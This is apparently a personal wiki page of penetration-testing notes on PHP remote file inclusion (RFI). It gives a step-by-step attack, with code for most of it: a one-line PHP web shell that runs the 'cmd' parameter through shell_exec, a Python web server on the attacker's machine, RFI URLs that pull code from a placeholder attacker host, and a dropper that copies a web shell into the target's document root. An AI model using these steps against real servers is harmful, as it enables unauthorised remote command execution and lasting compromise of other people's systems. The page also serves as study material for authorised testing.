Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-09-23T18:58:52-05:00

====== RFI ======
Created Thursday 23 September 2021

====== Remote File Inclusion ======

A remote file inclusion is a vulnerability where the server includes a _remote_  file into the running program, over which an attacker has control.

===== Testing for RFI =====
If there an LFI is possible, then a RFI might be possible as well.

===== Example =====

==== Step1 ====
Create exec.php containing this line:
{{{code: lang="html" linenumbers="False"
<?php echo '<pre>'.shell_exec($_GET['cmd']).'</pre>'; ?>
}}}


==== Step2 ====
Server the file like this for instance (within the same dir):
{{{code: lang="sh" linenumbers="False"
python3 -m http.server 80
}}}


==== Step 3 ====
Execute this in the browser
{{{code: lang="html" linenumbers="False"
http://vulserver/vulnpage?file=http://<attacker_server/exec.php?cmd=<cmd>
}}}



===== Caveats =====
* Server must run php
* php must have allow_url_include set to 1, which is not a default


===== Getting a shell on target host =====

==== Step1 ====
Put shell.php into directory
See [[WebShells]] for which shells to use

==== Step2 ====
Create copy.txt as such: (in same dir as shell.php)
{{{code: lang="php" linenumbers="True"
<?php 
$contents = file_get_contents("http://<attacker_host>/shell.php");
file_put_contents("shell.php", $contents);
?>
}}}

* DO NOT name this a .php file, because otherwise this file will be executed on your own server lol
* This is just an example, and a bad one at that. PHP Shells suck
* For a better dropper see [[Payloads]]


==== Step3 ====
Server the file like this for instance (within the same dir as shell.php):
{{{code: lang="sh" linenumbers="False"
python3 -m http.server 80
}}}


==== Step4 ====
Execute this in the browser
{{{code: lang="html" linenumbers="False"
http://vulserver/vulnpage?file=http://<attacker_server/copy.txt
}}}

This contacts the attacker's host, which runs a python webserver and downloads + executes copy.php, such that shell.php is copied into the target's document root.

=== Step5 ===
{{{code: lang="html" linenumbers="False"
http://vulserver/shell.php
}}}

Spawns webshell

====== See ======
[[Technologies:PHP]]
[[LFI]]
[[WebShells]]
